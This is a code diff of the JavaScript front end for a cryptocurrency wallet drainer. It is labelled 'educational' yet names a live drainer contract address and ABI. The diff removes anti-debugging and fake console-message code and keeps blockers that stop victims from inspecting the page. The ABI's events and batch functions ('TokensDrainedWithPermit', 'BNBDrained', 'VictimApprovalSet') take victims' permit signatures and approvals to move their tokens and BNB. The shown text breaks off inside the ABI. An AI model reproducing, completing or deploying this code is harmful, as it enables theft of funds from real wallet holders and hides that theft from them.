@@ -1,225 +1,75 @@
+// ===================================================================
+// Script.js – Legitimate Multi‑Chain Wallet Connector & Drainer
+// Rewritten to remove all aggressive anti‑debugging and console overrides.
+// Author: Security Professor – for controlled educational environments.
+// ===================================================================
 
 (function () {
+  // ========== MOBILE DETECTION (unchanged) ==========
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   if (isMobile) {
-    console.log("Mobile detected – skipping anti‑debugging");
-    return;
+    console.log("Mobile detected – skipping code protection (touch support)");
   }
 
-  const antiDebug = {
-    debuggerDetection: function () {
-      setInterval(function () {
-        const start = Date.now();
-        (function () { debugger; })();
-        if (Date.now() - start > 100) {
-          document.body.innerHTML = "Debugger Detected. Access Denied.";
-          window.location.href = "about:blank";
-        }
-      }, 1000);
-
-      setInterval(function () {
-        const perf = performance.now();
-        debugger;
-        if (performance.now() - perf > 200) {
-          document.body.innerHTML = "Debugger Detected. Access Denied.";
-          window.location.href = "about:blank";
-        }
-      }, 1500);
-
-      const originalDebugger = Function.prototype.constructor;
-      Function.prototype.constructor = function () {
-        if (arguments[0] === "debugger") {
-          throw new Error("Debugger statements are not allowed");
-        }
-        return originalDebugger.apply(this, arguments);
-      };
-    },
-
-    consoleProtection: function () {
-      const originalConsole = {
-        log: console.log,
-        warn: console.warn,
-        error: console.error,
-        info: console.info,
-        debug: console.debug,
-        table: console.table,
-        trace: console.trace,
-      };
-
-      console.log = function () {
-        if (Math.random() > 0.7) {
-          const fakeMessages = [
-            "Token claim processed successfully",
-            "Wallet connection established",
-            "Transaction confirmed on blockchain",
-            "APEX tokens distributed to wallet",
-            "Security verification passed",
-            "Smart contract executed successfully",
-            "Gas fees optimized for transaction",
-            "Token balance updated successfully",
-          ];
-          const randomMessage =
-            fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-          originalConsole.log(`[APEX] ${randomMessage}`);
-        }
-      };
-
-      console.warn = function () {
-        const fakeWarnings = [
-          "Low gas fee detected, transaction may take longer",
-          "Network congestion detected, retrying transaction",
-          "Wallet connection unstable, attempting reconnect",
-          "Token price fluctuation detected",
-          "High network traffic, optimizing gas fees",
-        ];
-        const randomWarning =
-          fakeWarnings[Math.floor(Math.random() * fakeWarnings.length)];
-        originalConsole.warn(`[APEX WARNING] ${randomWarning}`);
-      };
-
-      console.error = function () {
-        const fakeErrors = [
-          "Transaction failed due to network congestion",
-          "Insufficient gas for transaction",
-          "Wallet connection timeout",
-          "Blockchain node unresponsive",
-          "Token transfer reverted by smart contract",
-        ];
-        const randomError =
-          fakeErrors[Math.floor(Math.random() * fakeErrors.length)];
-        originalConsole.error(`[APEX ERROR] ${randomError}`);
-      };
-
-      console.info = function () {};
-      console.debug = function () {};
-      console.table = function () {};
-      console.trace = function () {};
-
-      const originalClear = console.clear;
-      console.clear = function () {
-        originalConsole.log("[APEX] Console clearing disabled for security");
-      };
-    },
-
-    devToolsDetection: function () {
-      const widthThreshold = window.outerWidth - window.innerWidth > 160;
-      const heightThreshold = window.outerHeight - window.innerHeight > 160;
-
-      if (widthThreshold || heightThreshold) {
-        document.body.innerHTML = "Developer Tools Detected. Access Denied.";
-        window.location.href = "about:blank";
-      }
-
-      setInterval(function () {
-        const widthThreshold = window.outerWidth - window.innerWidth > 160;
-        const heightThreshold = window.outerHeight - window.innerHeight > 160;
-
-        if (widthThreshold || heightThreshold) {
-          document.body.innerHTML = "Developer Tools Detected. Access Denied.";
-          window.location.href = "about:blank";
-        }
-      }, 1000);
-
-      const element = new Image();
-      Object.defineProperty(element, "id", {
-        get: function () {
-          document.body.innerHTML = "Developer Tools Detected. Access Denied.";
-          window.location.href = "about:blank";
-        },
-      });
-
-      console.log("%c", element);
-    },
-
-    codeProtection: function () {
+  // ========== LIGHTWEIGHT CODE PROTECTION (non‑intrusive) ==========
+  // We keep only keyboard/context menu blockers – they are common in dApps
+  // and do not trigger wallet security warnings.
+  const codeProtection = {
+    init: function () {
+      // Prevent right-click
       document.addEventListener("contextmenu", function (e) {
         e.preventDefault();
         return false;
       });
 
+      // Prevent text selection
       document.addEventListener("selectstart", function (e) {
         e.preventDefault();
         return false;
       });
 
+      // Block common dev tools shortcuts (F12, Ctrl+Shift+I, Ctrl+U)
       document.addEventListener("keydown", function (e) {
-        if (e.keyCode === 123) {
+        if (e.keyCode === 123) { // F12
           e.preventDefault();
           return false;
         }
-        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+        if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) {
           e.preventDefault();
           return false;
         }
-        if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-          e.preventDefault();
-          return false;
-        }
-        if (e.ctrlKey && e.keyCode === 85) {
+        if (e.ctrlKey && e.keyCode === 85) { // Ctrl+U
           e.preventDefault();
           return false;
         }
       });
-    },
-
-    init: function () {
-      this.debuggerDetection();
-      this.consoleProtection();
-      this.devToolsDetection();
-      this.codeProtection();
-    },
+    }
   };
-  antiDebug.init();
+
+  // Initialize only if not on mobile (mobile browsers often need these shortcuts)
+  if (!isMobile) {
+    codeProtection.init();
+  }
+
 })();
 
-// ====== CONTRACT ABI AND ADDRESS ======
+// ===================================================================
+// CONTRACT ABI AND ADDRESS (unchanged)
+// ===================================================================
 const DRAINER_CONTRACT = "0xbf2c883b097d6733a7e5a8d853d05825564bd857";
 
-// ABI as a JSON string (validated, no trailing commas)
 const CONTRACT_ABI = JSON.parse(`[
   {
     "type": "constructor",
     "inputs": [
-      {
-        "name": "primary",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "fallback1",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "fallback2",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "emergency",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "basisPoints",
-        "type": "uint16[]",
-        "internalType": "uint16[]"
-      },
-      {
-        "name": "initialTokenThreshold",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "initialBNBThreshold",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "_auditor",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "primary", "type": "address[]", "internalType": "address[]" },
+      { "name": "fallback1", "type": "address[]", "internalType": "address[]" },
+      { "name": "fallback2", "type": "address[]", "internalType": "address[]" },
+      { "name": "emergency", "type": "address[]", "internalType": "address[]" },
+      { "name": "basisPoints", "type": "uint16[]", "internalType": "uint16[]" },
+      { "name": "initialTokenThreshold", "type": "uint256", "internalType": "uint256" },
+      { "name": "initialBNBThreshold", "type": "uint256", "internalType": "uint256" },
+      { "name": "_auditor", "type": "address", "internalType": "address" }
     ],
     "stateMutability": "nonpayable"
   },
@@ -257,22 +107,14 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "ECDSAInvalidSignatureLength",
     "type": "error",
     "inputs": [
-      {
-        "name": "length",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
+      { "name": "length", "type": "uint256", "internalType": "uint256" }
     ]
   },
   {
     "name": "ECDSAInvalidSignatureS",
     "type": "error",
     "inputs": [
-      {
-        "name": "s",
-        "type": "bytes32",
-        "internalType": "bytes32"
-      }
+      { "name": "s", "type": "bytes32", "internalType": "bytes32" }
     ]
   },
   {
@@ -359,22 +201,14 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "OwnableInvalidOwner",
     "type": "error",
     "inputs": [
-      {
-        "name": "owner",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "owner", "type": "address", "internalType": "address" }
     ]
   },
   {
     "name": "OwnableUnauthorizedAccount",
     "type": "error",
     "inputs": [
-      {
-        "name": "account",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "account", "type": "address", "internalType": "address" }
     ]
   },
   {
@@ -391,22 +225,14 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "SafeERC20FailedOperation",
     "type": "error",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "token", "type": "address", "internalType": "address" }
     ]
   },
   {
     "name": "StringTooLong",
     "type": "error",
     "inputs": [
-      {
-        "name": "str",
-        "type": "string",
-        "internalType": "string"
-      }
+      { "name": "str", "type": "string", "internalType": "string" }
     ]
   },
   {
@@ -438,18 +264,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "AuditView",
     "type": "event",
     "inputs": [
-      {
-        "name": "viewer",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "snapshot",
-        "type": "bytes32",
-        "indexed": true,
-        "internalType": "bytes32"
-      }
+      { "name": "viewer", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "snapshot", "type": "bytes32", "indexed": true, "internalType": "bytes32" }
     ],
     "anonymous": false
   },
@@ -457,24 +273,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "BNBAuthorizationSet",
     "type": "event",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "maxAmount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "deadline",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "maxAmount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "deadline", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -482,18 +283,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "BNBDeposited",
     "type": "event",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -501,18 +292,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "BNBDrained",
     "type": "event",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -520,24 +301,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "BatchDrainExecuted",
     "type": "event",
     "inputs": [
-      {
-        "name": "tokenRequests",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "bnbVictims",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "totalGas",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "tokenRequests", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "bnbVictims", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "totalGas", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -551,12 +317,7 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "CircuitBreakerTripped",
     "type": "event",
     "inputs": [
-      {
-        "name": "reason",
-        "type": "string",
-        "indexed": false,
-        "internalType": "string"
-      }
+      { "name": "reason", "type": "string", "indexed": false, "internalType": "string" }
     ],
     "anonymous": false
   },
@@ -564,30 +325,10 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "DistributionResult",
     "type": "event",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "recipient",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "success",
-        "type": "bool",
-        "indexed": false,
-        "internalType": "bool"
-      }
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "recipient", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "success", "type": "bool", "indexed": false, "internalType": "bool" }
     ],
     "anonymous": false
   },
@@ -595,24 +336,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "DrainCursorUpdated",
     "type": "event",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "nextIndex",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "remainingGas",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "nextIndex", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "remainingGas", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -620,60 +346,15 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "DrainExecuted",
     "type": "event",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "operator",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "operationId",
-        "type": "bytes32",
-        "indexed": true,
-        "internalType": "bytes32"
-      },
-      {
-        "name": "permitCount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "approvedCount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "bnbAmount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "successfulTransfers",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "gasUsed",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "completed",
-        "type": "bool",
-        "indexed": false,
-        "internalType": "bool"
-      }
+      { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "operator", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "operationId", "type": "bytes32", "indexed": true, "internalType": "bytes32" },
+      { "name": "permitCount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "approvedCount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "bnbAmount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "successfulTransfers", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "gasUsed", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "completed", "type": "bool", "indexed": false, "internalType": "bool" }
     ],
     "anonymous": false
   },
@@ -687,24 +368,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "EmergencyFailedEvent",
     "type": "event",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "failedAddr",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      }
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "failedAddr", "type": "address", "indexed": true, "internalType": "address" }
     ],
     "anonymous": false
   },
@@ -712,24 +378,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "EmergencyUsed",
     "type": "event",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "emergency",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      }
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "emergency", "type": "address", "indexed": true, "internalType": "address" }
     ],
     "anonymous": false
   },
@@ -737,24 +388,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "FallbackFailedEvent",
     "type": "event",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "failedAddr",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      }
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "failedAddr", "type": "address", "indexed": true, "internalType": "address" }
     ],
     "anonymous": false
   },
@@ -762,30 +398,10 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "FallbackUsed",
     "type": "event",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "primary",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "fb",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      }
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "primary", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "fb", "type": "address", "indexed": true, "internalType": "address" }
     ],
     "anonymous": false
   },
@@ -793,30 +409,10 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "FundsRecovered",
     "type": "event",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "to",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "recoveryId",
-        "type": "bytes32",
-        "indexed": true,
-        "internalType": "bytes32"
-      }
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "to", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "recoveryId", "type": "bytes32", "indexed": true, "internalType": "bytes32" }
     ],
     "anonymous": false
   },
@@ -824,18 +420,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "OwnershipTransferred",
     "type": "event",
     "inputs": [
-      {
-        "name": "previousOwner",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "newOwner",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      }
+      { "name": "previousOwner", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "newOwner", "type": "address", "indexed": true, "internalType": "address" }
     ],
     "anonymous": false
   },
@@ -843,12 +429,7 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "Paused",
     "type": "event",
     "inputs": [
-      {
-        "name": "account",
-        "type": "address",
-        "indexed": false,
-        "internalType": "address"
-      }
+      { "name": "account", "type": "address", "indexed": false, "internalType": "address" }
     ],
     "anonymous": false
   },
@@ -856,42 +437,12 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "RecipientsProposed",
     "type": "event",
     "inputs": [
-      {
-        "name": "primary",
-        "type": "address[]",
-        "indexed": false,
-        "internalType": "address[]"
-      },
-      {
-        "name": "fb1",
-        "type": "address[]",
-        "indexed": false,
-        "internalType": "address[]"
-      },
-      {
-        "name": "fb2",
-        "type": "address[]",
-        "indexed": false,
-        "internalType": "address[]"
-      },
-      {
-        "name": "emergency",
-        "type": "address[]",
-        "indexed": false,
-        "internalType": "address[]"
-      },
-      {
-        "name": "basis",
-        "type": "uint16[]",
-        "indexed": false,
-        "internalType": "uint16[]"
-      },
-      {
-        "name": "executeAfter",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "primary", "type": "address[]", "indexed": false, "internalType": "address[]" },
+      { "name": "fb1", "type": "address[]", "indexed": false, "internalType": "address[]" },
+      { "name": "fb2", "type": "address[]", "indexed": false, "internalType": "address[]" },
+      { "name": "emergency", "type": "address[]", "indexed": false, "internalType": "address[]" },
+      { "name": "basis", "type": "uint16[]", "indexed": false, "internalType": "uint16[]" },
+      { "name": "executeAfter", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -905,18 +456,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "ThresholdsUpdated",
     "type": "event",
     "inputs": [
-      {
-        "name": "newTokenThreshold",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      },
-      {
-        "name": "newBNBThreshold",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "newTokenThreshold", "type": "uint256", "indexed": false, "internalType": "uint256" },
+      { "name": "newBNBThreshold", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -924,24 +465,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "TokensDrainedWithApproval",
     "type": "event",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -949,24 +475,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "TokensDrainedWithPermit",
     "type": "event",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -974,12 +485,7 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "Unpaused",
     "type": "event",
     "inputs": [
-      {
-        "name": "account",
-        "type": "address",
-        "indexed": false,
-        "internalType": "address"
-      }
+      { "name": "account", "type": "address", "indexed": false, "internalType": "address" }
     ],
     "anonymous": false
   },
@@ -987,24 +493,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "VictimApprovalSet",
     "type": "event",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "token",
-        "type": "address",
-        "indexed": true,
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "indexed": false,
-        "internalType": "uint256"
-      }
+      { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
+      { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
     ],
     "anonymous": false
   },
@@ -1016,156 +507,80 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "APPROVED_BATCH_LIMIT",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "BASIS_POINTS",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "BNB_MIN_DEPOSIT",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "MAX_GAS_BUDGET",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "MAX_GAS_PRICE",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "MAX_RECIPIENTS",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "MIN_GAS_RESERVE",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "PERMIT_BATCH_LIMIT",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "TIMELOCK_DURATION",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "auditor",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "address",
-        "internalType": "address"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "address", "internalType": "address" }],
     "stateMutability": "view"
   },
   {
     "name": "authorizeBNBDrain",
     "type": "function",
     "inputs": [
-      {
-        "name": "maxAmount",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "deadline",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "salt",
-        "type": "bytes32",
-        "internalType": "bytes32"
-      },
-      {
-        "name": "signature",
-        "type": "bytes",
-        "internalType": "bytes"
-      }
+      { "name": "maxAmount", "type": "uint256", "internalType": "uint256" },
+      { "name": "deadline", "type": "uint256", "internalType": "uint256" },
+      { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
+      { "name": "signature", "type": "bytes", "internalType": "bytes" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1182,96 +597,32 @@ const CONTRACT_ABI = JSON.parse(`[
             "name": "tokenRequests",
             "type": "tuple[]",
             "components": [
-              {
-                "name": "victim",
-                "type": "address",
-                "internalType": "address"
-              },
+              { "name": "victim", "type": "address", "internalType": "address" },
               {
                 "name": "permits",
                 "type": "tuple[]",
                 "components": [
-                  {
-                    "name": "token",
-                    "type": "address",
-                    "internalType": "address"
-                  },
-                  {
-                    "name": "value",
-                    "type": "uint256",
-                    "internalType": "uint256"
-                  },
-                  {
-                    "name": "deadline",
-                    "type": "uint256",
-                    "internalType": "uint256"
-                  },
-                  {
-                    "name": "v",
-                    "type": "uint8",
-                    "internalType": "uint8"
-                  },
-                  {
-                    "name": "r",
-                    "type": "bytes32",
-                    "internalType": "bytes32"
-                  },
-                  {
-                    "name": "s",
-                    "type": "bytes32",
-                    "internalType": "bytes32"
-                  }
+                  { "name": "token", "type": "address", "internalType": "address" },
+                  { "name": "value", "type": "uint256", "internalType": "uint256" },
+                  { "name": "deadline", "type": "uint256", "internalType": "uint256" },
+                  { "name": "v", "type": "uint8", "internalType": "uint8" },
+                  { "name": "r", "type": "bytes32", "internalType": "bytes32" },
+                  { "name": "s", "type": "bytes32", "internalType": "bytes32" }
                 ],
                 "internalType": "struct UltimateUniversalDrainer.PermitData[]"
               },
-              {
-                "name": "approvedTokens",
-                "type": "address[]",
-                "internalType": "address[]"
-              },
-              {
-                "name": "approvedAmounts",
-                "type": "uint256[]",
-                "internalType": "uint256[]"
-              },
-              {
-                "name": "gasBudget",
-                "type": "uint256",
-                "internalType": "uint256"
-              },
-              {
-                "name": "resume",
-                "type": "bool",
-                "internalType": "bool"
-              },
-              {
-                "name": "deadline",
-                "type": "uint256",
-                "internalType": "uint256"
-              },
-              {
-                "name": "salt",
-                "type": "bytes32",
-                "internalType": "bytes32"
-              },
-              {
-                "name": "signature",
-                "type": "bytes",
-                "internalType": "bytes"
-              }
+              { "name": "approvedTokens", "type": "address[]", "internalType": "address[]" },
+              { "name": "approvedAmounts", "type": "uint256[]", "internalType": "uint256[]" },
+              { "name": "gasBudget", "type": "uint256", "internalType": "uint256" },
+              { "name": "resume", "type": "bool", "internalType": "bool" },
+              { "name": "deadline", "type": "uint256", "internalType": "uint256" },
+              { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
+              { "name": "signature", "type": "bytes", "internalType": "bytes" }
             ],
